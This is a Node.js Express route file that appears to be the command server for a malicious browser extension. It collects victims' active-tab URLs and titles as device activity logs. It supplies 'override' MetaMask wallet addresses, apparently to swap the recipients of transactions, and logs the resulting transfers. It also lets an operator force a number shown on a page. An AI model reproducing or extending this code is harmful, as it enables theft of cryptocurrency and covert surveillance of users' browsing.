const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');

let presetValues = [];
let overrideValue = null;
let lastGeneratedNumber = null;
let lastDisplayedNumber = null;

const metaConfigPath = path.join(__dirname, '../configmeta.json');
const activityLogPath = path.join(__dirname, '../activityLog.json');
let metaMaskPresetValues = Array(10).fill('');
let metaMaskTransactionLog = [];
let activityLog = [];

function loadPresetValues() {
    const configPath = path.join(__dirname, '../config.json');
    if (fs.existsSync(configPath)) {
        try {
            const config = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
            presetValues = config.presetValues || Array(50).fill('');
        } catch (error) {
            console.error('[ERROR] Loading preset values:', error);
            presetValues = Array(50).fill('');
        }
    } else {
        presetValues = Array(50).fill('');
    }
}
loadPresetValues();

function loadMetaMaskPresets() {
    if (fs.existsSync(metaConfigPath)) {
        try {
            const metaConfig = JSON.parse(fs.readFileSync(metaConfigPath, 'utf-8'));
            metaMaskPresetValues = Array.isArray(metaConfig.metaMaskPresetValues)
                ? metaConfig.metaMaskPresetValues.slice(0, 10)
                : Array(10).fill('');
        } catch (error) {
            console.error('[ERROR] Loading MetaMask presets:', error);
            metaMaskPresetValues = Array(10).fill('');
        }
    } else {
        metaMaskPresetValues = Array(10).fill('');
    }
}
loadMetaMaskPresets();

if (fs.existsSync(activityLogPath)) {
    try {
        activityLog = JSON.parse(fs.readFileSync(activityLogPath, 'utf-8'));

        activityLog = activityLog.map(entry => ({
            ...entry,
            status: 'offline'
        }));

        saveActivityLog();

        console.log("[INFO] All devices set to offline on server start.");
    } catch (error) {
        console.error('[ERROR] Loading activity log:', error);
        activityLog = [];
    }
}

function saveActivityLog() {
    fs.writeFileSync(activityLogPath, JSON.stringify(activityLog, null, 2), 'utf-8');
}

function savePresetValues() {
    const configPath = path.join(__dirname, '../config.json');
    fs.writeFileSync(configPath, JSON.stringify({ presetValues }, null, 2), 'utf-8');
}

function saveMetaMaskConfig() {
    fs.writeFileSync(metaConfigPath, JSON.stringify({ metaMaskPresetValues }, null, 2), 'utf-8');
}

router.get('/getPresetValues', (req, res) => {
    res.json({ presetValues });
});

router.post('/savePresetValues', (req, res) => {
    presetValues = req.body.presetValues.slice(0, 50);
    savePresetValues();
    res.json({ success: true });
});

router.get('/getMetaMaskPresetValues', (req, res) => {
    res.json({ metaMaskPresetValues });
});

router.post('/saveMetaMaskPresetValues', (req, res) => {
    if (!Array.isArray(req.body.metaMaskPresetValues)) {
        return res.status(400).json({ success: false, message: 'Invalid data format' });
    }
    metaMaskPresetValues = req.body.metaMaskPresetValues.slice(0, 10);
    saveMetaMaskConfig();
    res.json({ success: true });
});

router.post('/extension-data', (req, res) => {
    const { action, value } = req.body;

    switch (action) {
        case 'setOverride':
            if (!isNaN(Number(value))) {
                overrideValue = Number(value);
                lastGeneratedNumber = overrideValue;
                lastDisplayedNumber = overrideValue;
                console.log(`[INFO] Override value set: ${value}`);
                res.json({ status: 'success', message: 'Override set successfully.' });
            } else {
                res.status(400).json({ status: 'error', message: 'Invalid number format.' });
            }
            break;

        case 'updateLastNumber':
            if (value) {
                lastDisplayedNumber = value;
                console.log(`[INFO] Last displayed number updated: ${value}`);
                res.json({ status: 'success', message: 'Number updated successfully.' });
            } else {
                res.status(400).json({ status: 'error', message: 'Value is missing.' });
            }
            break;

        case 'clearOverride':
            overrideValue = null;
            console.log('[INFO] Override value cleared.');
            res.json({ status: 'success', message: 'Override cleared successfully.' });
            break;

        default:
            res.status(400).json({ status: 'error', message: 'Unknown action.' });
    }
});

router.post('/updateActivity', (req, res) => {
    const { tag, activeTabInfo } = req.body;

    if (!tag || !activeTabInfo || !activeTabInfo.url) {
        console.warn('[WARNING] Invalid activity data received:', req.body);
        return res.status(400).json({ status: 'error', message: 'Invalid data from extension' });
    }

    const title = activeTabInfo.title && activeTabInfo.title.trim() !== '' ? activeTabInfo.title : 'No Title';

    const activityEntry = {
        status: 'online',
        tag,
        url: activeTabInfo.url,
        title,
        timestamp: new Date().toISOString()
    };

    console.log(`[INFO] Activity received: ${JSON.stringify(activityEntry)}`);
    activityLog.push(activityEntry);

    if (activityLog.length > 100) {
        activityLog.shift();
    }

    saveActivityLog();

    res.json({ status: 'success', message: 'Activity data received successfully' });
});

router.get('/getActivityLog', (req, res) => {
    res.json(activityLog);
});

router.get('/getLastGeneratedNumber', (req, res) => {
    res.json({ lastNumber: lastGeneratedNumber });
});

router.get('/getLastDisplayedNumber', (req, res) => {
    res.json({ lastNumber: lastDisplayedNumber });
});

router.get('/getOverrideValue', (req, res) => {
    res.json({ overrideValue });
});

router.post('/getMetaMaskOverrideValue', (req, res) => {
    const availableOverride = metaMaskPresetValues.find(val => val && val.trim() !== '');
    res.json({ status: availableOverride ? 'success' : 'no_override', overrideAddress: availableOverride || null });
});

router.post('/reportTransaction', (req, res) => {
    const { status, overrideAddress, timestamp } = req.body;
    if (!status || !overrideAddress || !timestamp) {
        return res.status(400).json({ status: 'error', message: 'Missing required data' });
    }

    const entry = { status, overrideAddress, timestamp };
    metaMaskTransactionLog.push(entry);

    if (metaMaskTransactionLog.length > 100) {
        metaMaskTransactionLog.shift();
    }

    console.log(`[INFO] MetaMask transaction logged: ${JSON.stringify(entry)}`);
    res.json({ status: 'success', message: 'Transaction logged successfully.' });
});

router.get('/getMetaMaskTransactionLog', (req, res) => {
    res.json(metaMaskTransactionLog);
});

router.post('/updateCredentials', (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).json({ message: 'Username and password are required.' });
    }

    const configPath = path.join(__dirname, '../configpass.json');

    try {
        fs.writeFileSync(configPath, JSON.stringify({ username, password }, null, 2), 'utf-8');
        res.json({ message: 'Credentials updated successfully.' });
    } catch (error) {
        console.error('[ERROR] Updating credentials:', error);
        res.status(500).json({ message: 'Failed to update credentials.' });
    }
});

module.exports = router;





